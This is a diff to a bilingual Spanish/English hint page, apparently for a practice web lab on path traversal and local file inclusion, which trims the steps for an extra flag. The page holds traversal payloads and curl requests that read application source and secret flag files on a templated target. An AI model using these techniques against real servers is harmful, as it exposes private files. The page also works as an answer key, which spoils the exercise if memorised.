@@ -50,12 +50,10 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
       <li>Directory listing vulnerable y flag dedicada LFI:
         <pre># Via traversal en el formulario web (desde /app/static/files/ → 2 niveles arriba → /app/secret/):
 ../../secret/LFI/flag.txt          # flag LFI
-../../secret/A05-flag.txt          # flag A05 Misconfiguration
 
-# Via endpoint de directorio expuesto:
+# Via endpoint de directorio expuesto (navegador/curl, no en el formulario LFI):
 curl "{{ target_base }}/secrets"              # directory listing
-curl "{{ target_base }}/secrets/LFI/flag.txt"
-curl "{{ target_base }}/secrets/A05-flag.txt"</pre></li>
+curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
     </ol>
     <h3>Medium — Bypass de filtro (strips ../ una vez)</h3>
     <ol>
@@ -102,12 +100,10 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
       <li>Exposed directory listing and dedicated LFI flag:
         <pre># Via traversal in the web form (from /app/static/files/ → 2 levels up → /app/secret/):
 ../../secret/LFI/flag.txt          # LFI flag
-../../secret/A05-flag.txt          # A05 Misconfiguration flag
 
-# Via exposed directory endpoint:
+# Via exposed directory endpoint (browser/curl, not in the LFI form):
 curl "{{ target_base }}/secrets"              # directory listing
-curl "{{ target_base }}/secrets/LFI/flag.txt"
-curl "{{ target_base }}/secrets/A05-flag.txt"</pre></li>
+curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
     </ol>
     <h3>Medium — Filter bypass (strips ../ once)</h3>
     <ol>
